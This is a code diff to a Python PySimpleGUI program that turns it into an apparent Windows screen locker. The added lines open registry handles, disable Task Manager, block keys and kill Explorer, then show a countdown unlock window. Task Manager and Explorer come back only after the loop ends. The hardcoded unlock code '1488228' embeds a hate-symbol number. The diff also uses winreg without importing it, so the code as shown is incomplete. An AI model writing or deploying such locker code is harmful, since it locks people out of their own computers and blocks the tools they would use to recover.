@@ -1,8 +1,13 @@
 import PySimpleGUI as sg
 from time import time
+import utils
 
+
+LM_REG = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
+CU_REG = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
 LOCKING_TIME = 600.00
 CODE = "1488228"
+
 
 def time_prettyfier(time):
 	#function for formating time from just seconds to mm:ss format
@@ -13,6 +18,15 @@ def time_prettyfier(time):
 	return mm + ":" + ss
 def reload_pc():
 	pass
+
+
+
+utils.disable_taskmngr()
+utils.block_keys()
+utils.kill_explorer()
+
+
+
 sg.theme("black")
 sg.set_options(font = 'Roboto 30', element_padding = (2, 20))
 layout = [
@@ -55,4 +69,6 @@ while True:
 			current_input = ""
 			window['-INPUT-'].update("")
 		window['-TIMER-'].update(time_prettyfier(round(LOCKING_TIME - abs(time() - start_time))))
+utils.enable_taskmngr()
+utils.run_explorer()
 window.close()
